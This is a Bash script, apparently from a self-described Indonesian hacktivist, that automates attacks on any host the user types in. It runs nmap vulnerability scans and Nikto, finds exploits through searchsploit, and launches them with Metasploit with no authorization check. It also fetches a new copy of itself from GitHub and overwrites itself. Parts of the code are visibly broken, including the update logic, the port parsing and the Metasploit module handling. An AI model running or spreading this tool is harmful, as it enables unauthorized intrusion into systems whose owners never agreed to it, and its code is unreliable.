#!/bin/bash

# Fungsi Banner
Banner() {
    clear
    echo "====================================="
    echo " Auto Exploit Scanner by bcevm-hacktivist Indonesia "
    echo "====================================="
}

# Fungsi Cek Update
Cek_Update() {
    echo "[+] Mengecek update..."
    repo_url="https://raw.githubusercontent.com/BCEVM/Xploit/main/exploit"
    local_version="1.0"
    latest_version=$(curl -sL "$repo_url" | grep "local_version=" | cut -d'"' -f2)

    if [ "$local_version" != "$latest_version" ]; then
        echo "[!] Versi terbaru tersedia: $latest_version"
        echo "[+] Gunakan perintah './exploit --update' untuk memperbarui."
        exit 1
    fi
}

# Fungsi Update
Fungsi_Update() {
    if [ "$1" == "--update" ]; then
        echo "[+] Mengunduh versi terbaru..."
        curl -sL "$repo_url" -o "$0"
        chmod +x "$0"
        echo "[+] Update selesai. Jalankan ulang script."
        exit 0
    fi
}

# Fungsi Scan dengan Nmap
Scan_Nmap() {
    echo "[+] Scanning target dengan Nmap dan script vuln..."
    nmap -p- -sV --script=vuln -T4 -oN nmap_scan.txt "$target"
}

# Fungsi Cek Layanan Web dengan Nikto
Cek_Nikto() {
    if echo "$open_ports" | grep -qE "80|443|8080|8443"; then
        echo "[+] Menjalankan Nikto..."
        nikto -h "$target" -o nikto_scan.txt
        echo "[+] Hasil Nikto disimpan di nikto_scan.txt"
    fi
}

# Fungsi Mengeksekusi Exploit
Eksekusi_Exploit() {
    echo "[+] Mencari exploit yang cocok..."
    for port in $open_ports; do
        service=$(grep "$port" nmap_scan.txt | awk '{print $3}')
        if [ -n "$service" ]; then
            exploit=$(searchsploit "$service" | grep -v "Exploits: No Results")

            if [ ! -z "$exploit" ]; then
                echo "[+] Exploit tersedia untuk $service di port $port"
                echo "$exploit"

                # Menjalankan Metasploit jika ada exploit yang cocok
                exploit_path=$(searchsploit -m "$service" | awk '{print $NF}')
                if [ -f "$exploit_path" ]; then
                    echo "use $exploit_path" > metasploit.rc
                    echo "set RHOSTS $target" >> metasploit.rc
                    echo "set RPORT $port" >> metasploit.rc
                    echo "exploit" >> metasploit.rc
                    msfconsole -q -r metasploit.rc
                else
                    echo "[-] Exploit tidak valid atau tidak ditemukan di Metasploit."
                fi
            fi
        fi
    done
    echo "[+] Proses selesai."
}

# Main Script
main() {
    Banner

    Cek_Update

    Fungsi_Update "$1"

    # Input target
    read -p "Masukkan target IP/domain: " target

    Scan_Nmap

    echo "[+] Mengecek hasil scanning..."
    open_ports=$(grep "open" nmap_scan.txt | awk '{print $1}' | tr -d '/tcp|/udp')

    if [ -z "$open_ports" ]; then
        echo "[-] Tidak ada port terbuka. Keluar..."
        exit 1
    fi

    echo "[+] Port terbuka: $open_ports"

    Cek_Nikto

    Eksekusi_Exploit
}

main "$1"
